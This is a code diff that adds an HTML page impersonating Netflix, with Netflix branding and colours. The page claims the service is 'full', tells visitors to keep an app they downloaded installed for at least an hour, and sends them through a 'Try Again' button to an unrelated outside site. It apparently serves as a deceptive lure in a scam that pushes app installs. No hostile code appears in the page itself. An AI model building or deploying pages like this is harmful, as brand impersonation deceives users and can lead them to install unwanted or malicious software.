@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Netflix</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #141414;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    .logo {
+      width: 150px;
+      margin-bottom: 40px;
+    }
+
+    .message {
+      font-size: 1.5rem;
+      max-width: 600px;
+      margin-bottom: 30px;
+      line-height: 1.6;
+    }
+
+    .note {
+      font-size: 1rem;
+      color: #bbbbbb;
+      max-width: 600px;
+      margin-bottom: 40px;
+    }
+
+    .button {
+      background-color: #e50914;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 1.2rem;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      text-decoration: none;
+    }
+
+    .button:hover {
+      background-color: #f6121d;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="logo" />
+
+  <div class="message">
+    Due to high demand, we’re currently full. Please click the button below and try again.
+  </div>
+
+  <div class="note">
+    Make sure to keep the app you downloaded installed for at least 1 hour to ensure there are no issues with access.
+  </div>
+
+  <a class="button" href="https://100grab.com">Try Again</a>
+</body>
+</html>
